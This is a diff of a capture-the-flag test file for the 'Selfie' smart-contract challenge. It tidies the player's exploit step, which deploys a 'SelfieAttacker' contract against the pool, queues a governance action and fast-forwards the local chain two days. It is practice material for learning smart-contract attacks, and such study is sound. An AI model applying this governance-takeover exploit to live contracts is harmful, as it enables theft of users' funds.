@@ -31,14 +31,7 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        // Deploy attacker contract
-        /*
-        const SelfieAttacker = await ethers.getContractFactory('SelfieAttacker', attacker);
-        const attack_contract = await SelfieAttacker.deploy(this.pool.address);
-        // */
-
         // Deploy attacker contract and add SimpleGovernance events to it
-        // /*
         // This is needed to parse events in transaction receipts.
         const attacker_artifact = await hre.artifacts.readArtifact('SelfieAttacker');
         const governance_artifact = await hre.artifacts.readArtifact('SimpleGovernance');
@@ -48,7 +41,6 @@ describe('[Challenge] Selfie', function () {
         ];
         const SelfieAttacker = new ethers.ContractFactory(abi, attacker_artifact.bytecode, attacker);
         const attack_contract = await SelfieAttacker.deploy(this.pool.address);
-        // */
 
         // Queue the action
         const tx = await attack_contract.attack();
@@ -75,8 +67,6 @@ describe('[Challenge] Selfie', function () {
         this.governance.on("ActionQueued", (actionId, _) => { console.log(actionId); });
         await new Promise(res => setTimeout(res, 4000));
         // */
-
-
 
         // Wait for 2 days
         await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
